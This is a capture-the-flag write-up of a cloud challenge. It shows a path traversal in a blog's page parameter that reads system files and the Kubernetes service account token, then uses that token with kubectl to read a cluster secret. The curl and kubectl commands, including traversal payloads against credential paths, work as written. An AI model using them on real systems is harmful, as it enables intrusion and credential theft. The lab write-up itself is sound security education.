# Whale Blog

This was in the cloud section and the info was a strong hint that this involved Docker and a link to a website http://whale-blog.duc.tf:30000.

I spent a bit of time looking around the website and clicking on the available links. The other blogs on the site were being loaded by a query parameter in the URL `?page=page1`. Because I'm an optimistic soul, I immediately tried `?page=flag` which didn't get me a flag but did show me in the dev tools that the server tried to load the file specified in the query and printed the output as a comment in the HTML. The error message was
```
>Warning</b>:  file_get_contents(./page3): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>6</b><br />
```
From this, I wondered if I could get any other files in the server container. `?page=../../../etc/passwd` went very well and printed out the contents of `/etc/passwd` as a comment in the HTML. However, it didn't get me closer to finding a flag and I couldn't find an obvious `flag.txt` file in the container to read.

I decided to have a look at the volumes mounted onto the container and so put `?page=../../../proc/mounts`. This revealed a mount called `/run/secrets/kubernetes.io/serviceaccount`, indicating that the container was running on kubernetes and that was the service account details for the pod to authenticate with the kubernetes api-server.

This was very interesting, so I quickly looked up the general format of `/run/secrets/kubernetes.io/serviceaccount` and found out that it normally contains a `ca.crt` file and a `token` file, containing the certificate and token respectively. At this point I moved away from the browser and dev tools to make it a bit easier to copy the secrets out. Running
```
curl "http://whale-blog.duc.tf:30000/?page=../../../run/secrets/kubernetes.io/serviceaccount/ca.crt"
curl "http://whale-blog.duc.tf:30000/?page=../../../run/secrets/kubernetes.io/serviceaccount/token"
```
got me the certificate and the JWT token the server pod uses to connect to the api-server of the kubernetes cluster it runs in.

At this point I was theoretically able to connect to the kubernetes cluster running the site using the pod's credentials, however I didn't know where the api-server was. Fortunately there was a helping hand in the form of a comment in the web HTML: "I wonder if we will deploy this at whale-blog.duc.tf or at whale-endpoint.duc.tf", so I decided to give whale-endpoint.duc.tf a go. The kubernetes api-server normally serves out of port 443 so I ran
```
curl -X GET https://whale-endpoint.duc.tf/api/core/v1/secrets --insecure
```
which produced
```
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {

  },
  "status": "Failure",
  "message": "v1 \"secrets\" is forbidden: User \"system:anonymous\" cannot get resource \"v1\" in API group \"\" at the cluster scope",
  "reason": "Forbidden",
  "details": {
    "name": "secrets",
    "kind": "v1"
  },
  "code": 403
}
```
indicating I'd found my api-server. I then saved the token as $TOKEN and ran
```
curl -X GET https://whale-endpoint.duc.tf/api/core/v1/secrets --header "Authorization: Bearer $TOKEN" --insecure
```
for further confirmation before configuring kubectl to use this token and cluster and having a look around:
```
kubectl config set-credentials ductf --token=$TOKEN
kubectl config set-cluster ductf --insecure-skip-tls-verify --server=https://whale-endpoint.duc.tf
kubectl config set-context ductf --cluster=ductf --namespace=default --user=ductf
kubectl config use-context ductf
kubectl get secrets # showed a secret called nooooo-dont-read-me
kubectl get secret -o yaml nooooo-dont-read-me
```
I could get the base64 encoded version of the secret from the yaml of noooo-dont-read-me. Base64 decoding it produced the flag!

I really enjoyed this challenge but did have one pedantic niggle. It said in a few places that it's a Docker challenge but really it's a Kubernetes challenge :P
